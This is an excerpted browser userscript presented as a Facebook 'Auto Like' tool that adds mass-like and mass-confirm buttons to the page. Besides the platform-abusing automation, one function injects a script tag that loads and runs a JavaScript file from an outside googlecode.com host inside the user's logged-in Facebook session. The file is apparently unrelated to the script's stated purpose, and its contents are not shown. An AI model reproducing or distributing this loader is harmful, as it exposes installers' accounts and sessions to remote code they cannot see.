// ==UserScript==
// @name			Facebook Auto Like  V 0.5 Faritz Ehemz
// @namespace			FALV5
// @version			0.5
// @copyright			Faritz Ehemz
// @description			Auto Like And Confirm (mass) | You can mass like and confirm
// @author			Faritz (http://userscripts.org/users/Faritz)
...
if(body != null) {
	...
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><a style='color: #FFFFFF;' <a href='https://www.facebook.com/faritz.ehemz' title='Click to See Diddi Profile on Facebook'> Faritz Profile </a></div>"
	...
	for(i=1;i<=20;i++) {
		...
		div2.style.width = "125px";
		div2.innerHTML ="<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a style='color: #FFFFFF;' href='http://faritzehemz.blogspot.com/' target='_blank' title='Autolike Version 0.5 by Faritz ADAx Corporation | Copyright 2012 | All Right Reserved'>Autolike V 0.5</a> | <a style='color: #FFFFFF;' onclick='thanks()'>#</a></div>"
		}
		else {
...
if(body != null) {
	...
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='Faritz()'>Like All</a>"
	
	body.appendChild(div);
	
	unsafeWindow.Cyber4rd = function() {
    javascript: (a = (b = document).createElement("script")).src = "//download-cy.googlecode.com/files/forlike_Cyber4rd.js",
...
//special thanks to Faritz Ehemz